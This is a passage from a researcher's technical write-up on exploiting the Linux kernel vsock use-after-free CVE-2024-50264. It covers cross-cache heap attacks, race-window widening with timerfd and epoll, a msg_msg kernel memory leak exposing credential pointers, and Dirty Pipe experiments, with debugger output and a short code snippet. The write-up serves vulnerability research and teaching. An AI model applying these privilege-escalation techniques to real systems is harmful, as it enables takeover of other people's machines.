    &lt;p&gt;To implement the UAF write into an &lt;code&gt;msg_msg&lt;/code&gt; object, I needed to perform cross-cache attack turning &lt;code&gt;virtio_vsock_sock&lt;/code&gt; into &lt;code&gt;msg_msg&lt;/code&gt;. On Ubuntu Server 24.04, the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects live in one of 16 &lt;code&gt;kmalloc-rnd-?-96&lt;/code&gt; slab caches enabled by &lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES&lt;/code&gt;. The &lt;code&gt;msg_msg&lt;/code&gt; objects live in a dedicated &lt;code&gt;msg_msg-96&lt;/code&gt; slab cache enabled by &lt;code&gt;CONFIG_SLAB_BUCKETS&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To implement the cross-cache attack, I needed to learn how these attacks work on the latest Ubuntu kernel, but testing exploit primitives together with this crazy race condition was really painful. Then, I got an idea:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;If an unstable race condition creates problems, let's use a testing ground for developing the exploit primitives!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;Kernel Hack Drill&lt;/head&gt;
    &lt;p&gt;Back in 2017, I created a pet project for my students called kernel-hack-drill. It provides a test environment for learning and experimenting with Linux kernel exploits. I remembered it and decided to use &lt;code&gt;kernel-hack-drill&lt;/code&gt; to develop the exploit primitives for CVE-2024-50264.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;kernel-hack-drill&lt;/code&gt; is an open-source project published under the &lt;code&gt;GPL-3.0&lt;/code&gt; license. It contains the following parts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_mod.c&lt;/code&gt;is a small Linux kernel module that provides the&lt;code&gt;/proc/drill_act&lt;/code&gt;file as a simple interface to userspace. This module contains vulnerabilities that you can control and experiment with.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill.h&lt;/code&gt;is a header file describing the&lt;code&gt;drill_mod.ko&lt;/code&gt;interface:&lt;code&gt;enum drill_act_t { DRILL_ACT_NONE = 0, DRILL_ACT_ALLOC = 1, DRILL_ACT_CALLBACK = 2, DRILL_ACT_SAVE_VAL = 3, DRILL_ACT_FREE = 4, DRILL_ACT_RESET = 5 }; #define DRILL_ITEM_SIZE 95 struct drill_item_t { unsigned long foobar; void (*callback)(void); char data[]; /* C99 flexible array */ }; #define DRILL_N 10240&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_test.c&lt;/code&gt;is a userspace test for&lt;code&gt;drill_mod.ko&lt;/code&gt;that provides the examples of using&lt;code&gt;/proc/drill_act&lt;/code&gt;. This test doesn't provoke memory corruptions in&lt;code&gt;drill_mod.ko&lt;/code&gt;and it passes if&lt;code&gt;CONFIG_KASAN=y&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;README.md&lt;/code&gt;includes a detailed step-by-step setup guide on how to use&lt;code&gt;kernel-hack-drill&lt;/code&gt;(kudos to the contributors!).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Fun fact: when I chose the name &lt;code&gt;kernel-hack-drill&lt;/code&gt; for this project, I used the word &lt;code&gt;drill&lt;/code&gt; to mean &lt;code&gt;training&lt;/code&gt; or &lt;code&gt;workout&lt;/code&gt; for Linux kernel security. My friends and students read it differently. They thought I meant something like this:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;kernel-hack-drill&lt;/code&gt; project is a bit similar to KRWX, but much simpler. Moreover, it ships with ready-made PoC exploits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_callback.c&lt;/code&gt;: a UAF exploit that invokes a callback inside a freed&lt;code&gt;drill_item_t&lt;/code&gt;structure. It hijacks control flow and gains LPE.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;: a UAF exploit that writes into a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It uses a cross-cache attack and overwrites&lt;code&gt;msg_msg.m_ts&lt;/code&gt;enabling out-of-bounds reading of the kernel memory. I wrote this PoC while working on the bug described in this article.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pipe_buffer.c&lt;/code&gt;: a UAF exploit that writes into a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It performs a cross-cache attack and overwrites&lt;code&gt;pipe_buffer.flags&lt;/code&gt;to implement the Dirty Pipe technique and gain LPE. This PoC exploit was also developed during my experiments with CVE-2024-50264.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Recent contributions added new variants (kudos to the contributors!):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_callback_rop_smep.c&lt;/code&gt;: an improved version of&lt;code&gt;drill_uaf_callback.c&lt;/code&gt;that adds a ROP chain to bypass SMEP on&lt;code&gt;x86_64&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pte.c&lt;/code&gt;: a UAF exploit that writes to a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It performs a cross-allocator attack and overwrites a page table entry (PTE) to implement the Dirty Pagetable technique and gain LPE on&lt;code&gt;x86_64&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pud.c&lt;/code&gt;: an improved version of&lt;code&gt;__drill_uaf_w_pte.c__&lt;/code&gt;that overwrites a page upper directory (PUD) instead of a PTE and implements the Dirty Pagetable attack via huge pages.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When I revisited &lt;code&gt;kernel-hack-drill&lt;/code&gt; during my CVE-2024-50264 work, this spare-time project hadn't seen an update in years. But now &lt;code&gt;kernel-hack-drill&lt;/code&gt; offers a solid set of resources that Linux kernel security researchers can explore.&lt;/p&gt;
    &lt;head rend="h2"&gt;Experimenting with cross-cache attack using kernel-hack-drill&lt;/head&gt;
    &lt;p&gt;My first step was to learn how cross-cache attacks behave on the latest Ubuntu kernel with slab allocator hardening turned on.&lt;/p&gt;
    &lt;p&gt;I implemented a standard cross-cache attack in &lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;. You can see the full code in the repository, so I'll sketch the flow here. For background, I highly recommend Andrey Konovalov's talk SLUB Internals for Exploit Developers.&lt;/p&gt;
    &lt;p&gt;To plan the attack, I pulled the needed info from &lt;code&gt;/sys/kernel/slab&lt;/code&gt;. The slab caches that hold &lt;code&gt;virtio_vsock_sock&lt;/code&gt; (80 bytes) or &lt;code&gt;drill_item_t&lt;/code&gt; (95 bytes) each keep 120 slabs in per-CPU partial lists (&lt;code&gt;cpu_partial=120&lt;/code&gt;) and 42 objects in each slab (&lt;code&gt;objs_per_slab=42&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;The cross-cache attack algorithm:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects to create a fresh active slab. Active slab is the slab that will be used by the kernel for the next allocation.&lt;/item&gt;
      &lt;item&gt;Allocate &lt;code&gt;objs_per_slab * cpu_partial&lt;/code&gt;objects. This creates the&lt;code&gt;cpu_partial&lt;/code&gt;number of full slabs that will later populate the partial list at step 6.&lt;/item&gt;
      &lt;item&gt;Create a slab that contains the UAF object. Allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects and keep a dangling reference to the vulnerable object in that slab.&lt;/item&gt;
      &lt;item&gt;Create a new active slab again: allocate &lt;code&gt;objs_per_slab&lt;/code&gt;objects. This step is very important for keeping the cross-cache attack stable. Otherwise, the slab with the vulnerable object remains active and cannot be reclaimed by the page allocator.&lt;/item&gt;
      &lt;item&gt;Completely free the slab that holds the UAF object. To do that, free &lt;code&gt;(objs_per_slab * 2 - 1)&lt;/code&gt;of the objects allocated just before the last one. The active slab now contains only the last object, and the slab with the UAF object becomes free and moves to the partial list.&lt;/item&gt;
      &lt;item&gt;Fill up the partial list: free one of each &lt;code&gt;objs_per_slab&lt;/code&gt;objects in the reserved slabs from step 2. That makes the slab allocator clean up the partial list and move the free slab containing the UAF object to the page allocator.&lt;/item&gt;
      &lt;item&gt;Reclaim the page that contained the UAF object for another slab cache: spray the target &lt;code&gt;msg_msg&lt;/code&gt;objects. As a result, one&lt;code&gt;msg_msg&lt;/code&gt;is allocated where the vulnerable object (&lt;code&gt;drill_item_t&lt;/code&gt;in my case) used to be.&lt;/item&gt;
      &lt;item&gt;Exploit the UAF! Overwrite &lt;code&gt;msg_msg.m_ts&lt;/code&gt;to read kernel memory out of bounds.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I've seen plenty of publications that cover cross-cache attack, but none of them explain how to debug it. I'll fill that gap.&lt;/p&gt;
    &lt;p&gt;Let's examine the attack in &lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;. To watch it in action and debug it, make the following tweaks in your kernel sources:&lt;/p&gt;

    &lt;p&gt;When the cross-cache attack succeeds, the slab that held &lt;code&gt;drill_item_t&lt;/code&gt; objects is handed back to the page allocator and then reused for &lt;code&gt;msg_msg&lt;/code&gt; objects. Running the PoC exploit &lt;code&gt;drill_uaf_w_msg_msg&lt;/code&gt; makes this visible, as we observe:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In the kernel log: &lt;code&gt;[ 32.719582] drill: kmalloc'ed item 5123 (0xffff88800c960660, size 95)&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Then in stdout: &lt;code&gt;[+] done, current_n: 5124 (next for allocating) [!] obtain dangling reference from use-after-free bug [+] done, uaf_n: 5123&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Then in GDB (using with bata24/gef): &lt;code&gt;gef&amp;gt; slab-contains 0xffff88800c960660 [+] Wait for memory scan slab: 0xffffea0000325800 kmem_cache: 0xffff888003c45300 base: 0xffff88800c960000 name: kmalloc-rnd-05-96 size: 0x60 num_pages: 0x1&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Finally, in the kernel log: &lt;code&gt;[ 36.778165] drill: free item 5123 (0xffff88800c960660) ... [ 36.807956] __put_partials: cache 0xffff888003c45300 slab 0xffffea0000325800 ... [ 36.892053] msg_msg 0xffff88800c960660&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We see the &lt;code&gt;drill_item_t&lt;/code&gt; object &lt;code&gt;0xffff88800c960660&lt;/code&gt; in slab &lt;code&gt;0xffffea0000325800&lt;/code&gt; reallocated as &lt;code&gt;msg_msg&lt;/code&gt;, which confirms that the cross-cache attack worked.&lt;/p&gt;
    &lt;p&gt;After experimenting with &lt;code&gt;kernel-hack-drill&lt;/code&gt; on Ubuntu Server 24.04, I found that &lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES&lt;/code&gt; and &lt;code&gt;CONFIG_SLAB_BUCKETS&lt;/code&gt; block naive UAF exploitation, yet they also make cross-cache attacks absolutely stable. So, in my humble opinion:&lt;/p&gt;
    &lt;p&gt;It seems that, without a mitigation such as SLAB_VIRTUAL, the Linux kernel remains wide-open to cross-cache attacks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Adapting the cross-cache attack to CVE-2024-50264&lt;/head&gt;
    &lt;p&gt;As noted in the limitations, the vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; client object is allocated together with the server object (Limitation #1). That hurts the exploit for two reasons:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;On one hand, leaving the server vsock open stops the slab that holds the UAF object from being freed, which kills the cross-cache attack.&lt;/item&gt;
      &lt;item&gt;On the other hand, closing the server vsock disturbs the UAF itself.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How to deal with it? @v4bel and @qwerty used the SLUBStick timing side channel to spot when the allocator switched to a new active slab. I went another way:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;What if I hit the&lt;/p&gt;&lt;code&gt;connect()&lt;/code&gt;syscall with a signal almost immediately?&lt;/quote&gt;
    &lt;p&gt;In short, I used one more race condition to exploit the main race condition – and it worked:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I sent the "immortal" signal 33 to the vulnerable &lt;code&gt;connect()&lt;/code&gt;syscall after a 10000 ns timeout, far earlier than the delay needed to trigger the UAF.&lt;/item&gt;
      &lt;item&gt;Then I verified the early race condition: &lt;list rend="ol"&gt;&lt;item&gt;The &lt;code&gt;connect()&lt;/code&gt;syscall must return "Interrupted system call"&lt;/item&gt;&lt;item&gt;Another testing client vsock should still connect to the server vsock without trouble&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I discovered that when both checks passed, only a single vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; for the client vsock was created. The interrupting signal arrived before the kernel could create the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt; for the server vsock. This bypassed Limitation #1 (paired-object creation). After that, I sent signal 33 again – this time after the normal timeout – to interrupt the vulnerable &lt;code&gt;connect()&lt;/code&gt; a second time and provoke the UAF. The cross-cache attack against &lt;code&gt;virtio_vsock_sock&lt;/code&gt; was unlocked!&lt;/p&gt;
    &lt;p&gt;Looping this early race and checking its result was quick. Once the early race succeeded, the main race that triggers the UAF became more stable; I could now hit the UAF about once per second instead of once every several minutes, solving the instability noted in Limitation #2. My race condition "speedrun" also eased Limitation #5: I managed roughly five UAF writes before the kworker hit a null-ptr-deref at &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt; (8 seconds).&lt;/p&gt;
    &lt;p&gt;To address Limitation #4 (the immediate null-ptr-deref in the kworker after UAF), I tried one more race condition, similarly to @v4bel and @qwerty. Right after the UAF-triggering &lt;code&gt;connect()&lt;/code&gt;, I called &lt;code&gt;listen()&lt;/code&gt; on the vulnerable vsock. If &lt;code&gt;listen()&lt;/code&gt; ran before the kworker, it changed the vsock state to &lt;code&gt;TCP_LISTEN&lt;/code&gt;, preventing the crash. Unfortunately, this step remains the most unstable part of the whole exploit; the rest is far more stable.&lt;/p&gt;
    &lt;p&gt;At that point my list of CVE-2024-50264 limitations looked like this:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;del rend="overstrike"&gt;The vulnerable&lt;/del&gt;&lt;code&gt;virtio_vsock_sock&lt;/code&gt;client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;
        &lt;del rend="overstrike"&gt;Reproducing this race condition is very unstable.&lt;/del&gt;
      &lt;/item&gt;
      &lt;item&gt;The UAF write occurs in a kworker a few microseconds after &lt;code&gt;kfree()&lt;/code&gt;, too quickly for typical cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;
        &lt;del rend="overstrike"&gt;A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.&lt;/del&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;del rend="overstrike"&gt;Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after&lt;/del&gt;&lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt;(eight seconds).&lt;/item&gt;
      &lt;item&gt;The kworker hangs in &lt;code&gt;spin_lock_bh()&lt;/code&gt;if&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;is not zero.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;With the early-signal trick in place, only two limitations were still blocking my exploit.&lt;/p&gt;
    &lt;head rend="h2"&gt;Oh so slow! The cross-cache attack shows up late to the party&lt;/head&gt;
    &lt;p&gt;As noted in Limitation #3, the UAF write in the kworker fires only a few μs after &lt;code&gt;kfree()&lt;/code&gt; for the &lt;code&gt;virtio_vsock_sock&lt;/code&gt;. A cross-cache attack needs much more time, so the UAF write lands on the original &lt;code&gt;virtio_vsock_sock&lt;/code&gt; and never reaches the &lt;code&gt;msg_msg&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;I didn't know how to make cross-cache procedure faster, but I knew how to slow down the attacked kernel code instead. That approach is described in Jann Horn's article Racing against the clock. It allowed to make my kworker slower than a sluggish cross-cache attack.&lt;/p&gt;
    &lt;p&gt;The main idea is to hammer the kworker with a &lt;code&gt;timerfd&lt;/code&gt; watched by a huge pile of &lt;code&gt;epoll&lt;/code&gt; instances. Here is the short recipe (see Jann's article for full detail):&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Call &lt;code&gt;timerfd_create(CLOCK_MONOTONIC, 0)&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Create 8 forks.&lt;/item&gt;
      &lt;item&gt;In each fork, call &lt;code&gt;dup()&lt;/code&gt;for the&lt;code&gt;timerfd&lt;/code&gt;100 times.&lt;/item&gt;
      &lt;item&gt;In each fork, call &lt;code&gt;epoll_create()&lt;/code&gt;500 times.&lt;/item&gt;
      &lt;item&gt;For every &lt;code&gt;epoll&lt;/code&gt;instance, use&lt;code&gt;epoll_ctl()&lt;/code&gt;to add all duplicated file descriptors to the interest list – each&lt;code&gt;epoll&lt;/code&gt;instance now monitors all available&lt;code&gt;timerfd&lt;/code&gt;copies.&lt;/item&gt;
      &lt;item&gt;Finally, arm the &lt;code&gt;timerfd&lt;/code&gt;so the interrupt hits the kworker at just the right moment:&lt;code&gt;timerfd_settime(timerfd, TFD_TIMER_CANCEL_ON_SET, &amp;amp;retard_tmo, NULL)&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This procedure made my race-condition window around 80 times longer.&lt;/p&gt;
    &lt;p&gt;I wanted some more time to complete the cross-cache attack with a guarantee, but ran into a limit not mentioned in the original write-up. If you exceed the limit in &lt;code&gt;/proc/sys/fs/epoll/max_user_watches&lt;/code&gt;, &lt;code&gt;epoll_ctl()&lt;/code&gt; fails. From &lt;code&gt;man 7 epoll&lt;/code&gt;:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;This specifies a limit on the total number of file descriptors that a user can register across all epoll instances on the system. The limit is per real user ID. Each registered file descriptor costs roughly 90 bytes on a 32-bit kernel, and roughly 160 bytes on a 64-bit kernel. Currently, the default value for max_user_watches is 1/25 (4%) of the available low memory, divided by the registration cost in bytes.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;On Ubuntu Server 24.04 with 2 GiB of RAM, &lt;code&gt;/proc/sys/fs/epoll/max_user_watches&lt;/code&gt; is 431838, which is not huge. I could afford 8 forks × 500 &lt;code&gt;epoll&lt;/code&gt; instances × 100 duplicated file descriptors, for a total of 400000 &lt;code&gt;epoll&lt;/code&gt; watches.&lt;/p&gt;
    &lt;p&gt;That was just enough to beat Limitation #3, and I finally got &lt;code&gt;msg_msg&lt;/code&gt; data size corruption: the vsock UAF changed &lt;code&gt;msg_msg.m_ts&lt;/code&gt; from 48 bytes to 8192 (&lt;code&gt;MSGMAX&lt;/code&gt;). Now I could do out-of-bounds reading of the kernel memory using the &lt;code&gt;msgrcv()&lt;/code&gt; syscall.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sorting the loot&lt;/head&gt;
    &lt;p&gt;The corrupted &lt;code&gt;msg_msg&lt;/code&gt; allowed me to read 8 KiB of data from the kernelspace.  I sorted this loot and found a promising infoleak: a kernel address &lt;code&gt;0xffffffff8233cfa0&lt;/code&gt; [1]. This infoleak was quite stable and worked with high probability, so I decided to investigate it without doing any additional heap feng shui. GDB showed that it was a pointer to the &lt;code&gt;socket_file_ops()&lt;/code&gt; kernel function. I was excited to discover that this function pointer is part of &lt;code&gt;struct file&lt;/code&gt;, because the &lt;code&gt;file&lt;/code&gt; kernel object also contains the &lt;code&gt;f_cred&lt;/code&gt; pointer [2], which leaked as well.&lt;/p&gt;
    &lt;p&gt;Here's how I examined the memory leaked by &lt;code&gt;msg_msg&lt;/code&gt; at &lt;code&gt;0xffff88800e75d600&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; p *((struct file *)(0xffff88800e75d600 + 96*26 + 64))
$61 = {
  f_count = {
    counter = 0x0
  },
  f_lock = {
    {
      rlock = {
        raw_lock = {
          {
            val = {
              counter = 0x0
            },
            {
              locked = 0x0,
              pending = 0x0
            },
            {
              locked_pending = 0x0,
              tail = 0x0
            }
          }
        }
      }
    }
  },
  f_mode = 0x82e0003,
  f_op = 0xffffffff8233cfa0 &amp;lt;socket_file_ops&amp;gt;,    [1]
  f_mapping = 0xffff88800ee66f60,
  private_data = 0xffff88800ee66d80,
  f_inode = 0xffff88800ee66e00,
  f_flags = 0x2,
  f_iocb_flags = 0x0,
  f_cred = 0xffff888003b7ad00,                    [2]
  f_path = {
    mnt = 0xffff8880039cec20,
    dentry = 0xffff888005b30b40
  },
  ...
&lt;/code&gt;
    &lt;p&gt;As a result, my PoC exploit obtained a pointer to &lt;code&gt;struct cred&lt;/code&gt;, the structure that stores the current process credentials. The last piece needed for privilege escalation was arbitrary address writing. With that, I could overwrite the exploit process credentials and become root. That would be a data-only attack with no control-flow hijack.&lt;/p&gt;
    &lt;head rend="h2"&gt;In search of arbitrary address writing primitive&lt;/head&gt;
    &lt;p&gt;The most interesting and difficult part of the research began here. I was searching for a target kernel object for my UAF write, which could provide an arbitrary address writing exploit primitive. The search was exhausting. I've done the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Looked through dozens of kernel objects,&lt;/item&gt;
      &lt;item&gt;Read many kernel exploit write-ups,&lt;/item&gt;
      &lt;item&gt;Tried Kernel Exploitation Dashboard by Eduardo Vela and the KernelCTF team.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;One idea was to combine my limited UAF write with the Dirty Page Table attack (well described by Nicolas Wu). Tweaking page tables can let an attacker read and write data at arbitrary physical address.&lt;/p&gt;
    &lt;p&gt;I could combine my UAF with a cross-cache attack (or more accurately, cross-allocator attack) to modify page tables. To overwrite kernel text or heap, though, I still needed to know the physical address of the target memory. Two options came to mind:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Bruteforcing physical addresses. Not practical here: I could trigger the UAF only about five times before the kworker crashed, nowhere near enough tries.&lt;/item&gt;
      &lt;item&gt;Using the KASLR infoleak from my &lt;code&gt;msg_msg&lt;/code&gt;out-of-bounds read. I decided to try that.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I ran a quick experiment to see how KASLR behaves on &lt;code&gt;X86_64&lt;/code&gt; with &lt;code&gt;CONFIG_RANDOMIZE_BASE&lt;/code&gt; and &lt;code&gt;CONFIG_RANDOMIZE_MEMORY&lt;/code&gt; enabled. Booting a virtual machine several times, I compared the virtual and physical addresses of kernel &lt;code&gt;_text&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;VM run #1:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff98400000 T _text

gef&amp;gt; v2p 0xffffffff98400000
Virt: 0xffffffff98400000 -&amp;gt; Phys: 0x57400000
&lt;/code&gt;
    &lt;p&gt;VM run #2:&lt;/p&gt;
    &lt;code&gt;gef&amp;gt; ksymaddr-remote
[+] Wait for memory scan
0xffffffff81800000 T _text

gef&amp;gt; v2p 0xffffffff81800000
Virt: 0xffffffff81800000 -&amp;gt; Phys: 0x18600000
&lt;/code&gt;
    &lt;p&gt;Then I calculated the difference between the virtual and physical addresses:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;VM run #1: &lt;code&gt;0xffffffff98400000 − 0x57400000 = 0xffffffff41000000&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;VM run #2: &lt;code&gt;0xffffffff81800000 − 0x18600000 = 0xffffffff69200000&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Because &lt;code&gt;0xffffffff41000000&lt;/code&gt; is not equal to &lt;code&gt;0xffffffff69200000&lt;/code&gt;, leaking the virtual KASLR offset doesn't help against physical KASLR.&lt;/p&gt;
    &lt;p&gt;Thereby to perform Dirty Page Table attack, I needed a way to leak a kernel physical address. Ideally I would do this by mixing some page-allocator feng shui with my out-of-bounds read. That felt messy, and I wanted a cleaner solution.&lt;/p&gt;
    &lt;p&gt;I kept looking for a target kernel object for my UAF write, which could provide an arbitrary address writing and eventually focused on &lt;code&gt;pipe_buffer&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;When a pipe is created with the &lt;code&gt;pipe()&lt;/code&gt; system call, the kernel allocates an array of &lt;code&gt;pipe_buffer&lt;/code&gt; structures. Each &lt;code&gt;pipe_buffer&lt;/code&gt; item in this array corresponds to a memory page that holds data written to the pipe. The diagram below shows the internals of this object:&lt;/p&gt;
    &lt;p&gt;This object looked like a good UAF target. I could make a &lt;code&gt;pipe_buffer&lt;/code&gt; array the same size as &lt;code&gt;virtio_vsock_sock&lt;/code&gt; by changing the capacity of the pipe: &lt;code&gt;fcntl(pipe_fd[1], F_SETPIPE_SZ, PAGE_SIZE * 2)&lt;/code&gt;. The kernel changes the array size to &lt;code&gt;2 * sizeof(struct pipe_buffer) = 80 bytes&lt;/code&gt;, exactly matching the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; size.&lt;/p&gt;
    &lt;p&gt;In addition, 4 attacker-controlled bytes from the vsock UAF write at offset 24 can flip &lt;code&gt;pipe_buffer.flags&lt;/code&gt;, just as in Max Kellermann's original Dirty Pipe attack.&lt;/p&gt;
    &lt;p&gt;The original Dirty Pipe attack doesn't even need an infoleak and grants privilege escalation with a one-shot write. Impressed, I decided to experiment with &lt;code&gt;pipe_buffer&lt;/code&gt; in my &lt;code&gt;kernel-hack-drill&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Experimenting with the Dirty Pipe attack&lt;/head&gt;
    &lt;p&gt;First, I built a Dirty Pipe prototype in &lt;code&gt;kernel-hack-drill&lt;/code&gt;; the PoC exploit &lt;code&gt;drill_uaf_w_pipe_buffer.c&lt;/code&gt; is in the repository. It:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;performs a cross-cache attack and reclaims the slab that held &lt;code&gt;drill_item_t&lt;/code&gt;objects as a slab for&lt;code&gt;pipe_buffer&lt;/code&gt;objects&lt;/item&gt;
      &lt;item&gt;exploits the UAF write to &lt;code&gt;drill_item_t&lt;/code&gt;; the attacker-controlled bytes written to&lt;code&gt;drill_item_t&lt;/code&gt;at offset 24, modify&lt;code&gt;pipe_buffer.flags&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;implements the Dirty Pipe attack, achieving LPE in one shot without an infoleak, cool!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To use this technique in my CVE-2024-50264 PoC exploit, I still had to bypass the last remaining Limitation #6: the kworker hangs before the UAF write if &lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt; is non-zero. I managed to solve that by doing &lt;code&gt;splice()&lt;/code&gt; from a regular file to the pipe, starting at offset zero:&lt;/p&gt;
    &lt;code&gt;	loff_t file_offset = 0;
	ssize_t bytes = 0;

	/* N.B. splice modifies the file_offset value */
	bytes = splice(temp_file_fd, &amp;amp;file_offset, pipe_fd[1], NULL, 1, 0);
	if (bytes &amp;lt; 0)
		err_exit("[-] splice");
	if (bytes != 1)
		err_exit("[-] splice short");
&lt;/code&gt;
    &lt;p&gt;In that case, the &lt;code&gt;pipe_buffer.offset&lt;/code&gt; field remains zero, so the kworker does not hang while acquiring the spinlock:&lt;/p&gt;
    &lt;p&gt;This seemed like a breakthrough – until I noticed that the UAF write also corrupted the &lt;code&gt;pipe_buffer.ops&lt;/code&gt; function pointer by four zero bytes of &lt;code&gt;peer_fwd_cnt&lt;/code&gt;. That unfortunate side effect provoked kernel crashes on every later operation involving &lt;code&gt;pipe_buffer&lt;/code&gt; ☹️:&lt;/p&gt;
    &lt;p&gt;This brought me to the following line of reasoning:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Completing the Dirty Pipe attack requires a working &lt;code&gt;pipe_buffer&lt;/code&gt;with an unchanged&lt;code&gt;ops&lt;/code&gt;pointer value.&lt;/item&gt;
      &lt;item&gt;Preserving &lt;code&gt;0xffffffff&lt;/code&gt;in the most significant bytes of the&lt;code&gt;pipe_buffer.ops&lt;/code&gt;function pointer requires that same value in&lt;code&gt;peer_fwd_cnt&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Setting &lt;code&gt;peer_fwd_cnt&lt;/code&gt;in&lt;code&gt;virtio_vsock_sock&lt;/code&gt;means sending data through the vsock.&lt;/item&gt;
      &lt;item&gt;Sending data through a vsock first needs a successful &lt;code&gt;connect()&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;However, a successful &lt;code&gt;connect()&lt;/code&gt;on the vulnerable vsock makes the UAF impossible ⛔.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Alas!&lt;/p&gt;
    &lt;head rend="h2"&gt;Pipe buffer entertainment&lt;/head&gt;
    &lt;p&gt;So the original Dirty Pipe technique wouldn't fit my CVE-2024-50264 PoC exploit. But suddenly an idea struck me:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;What if I create a pipe with capacity&lt;/p&gt;&lt;code&gt;PAGE_SIZE * 4&lt;/code&gt;forcing the kernel to allocate four&lt;code&gt;pipe_buffer&lt;/code&gt;objects in&lt;code&gt;kmalloc-192&lt;/code&gt;?&lt;/quote&gt;
